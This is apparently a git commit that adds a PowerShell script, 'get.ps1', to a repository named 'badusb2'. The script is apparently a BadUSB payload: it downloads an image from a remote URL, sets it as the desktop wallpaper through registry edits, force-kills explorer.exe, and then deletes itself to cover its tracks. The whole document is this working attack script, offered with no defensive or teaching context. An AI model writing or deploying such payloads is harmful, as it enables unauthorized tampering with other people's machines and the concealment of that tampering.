c9f30be44c04e23592d488fe0606ede0a64fd800
18838167725 <40076565+18838167725@users.noreply.github.com>
2020-02-28 22:24:05 +0800

    Add files via upload

---
+++ get.ps1
@@ -0,0 +1,10 @@
+cd \;
+(New-Object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/18838167725/badusb2/master/pic.jpg","d:\x.jpg");
+Start-Sleep -Seconds 15;
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /d d:\x.jpg /f;RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters;
+taskkill /F /IM explorer.exe;
+Start-Sleep -Seconds 5;
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /d d:\x.jpg /f;RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters;
+taskkill /F /IM explorer.exe;
+Remove-Item get.ps1;
+exit;
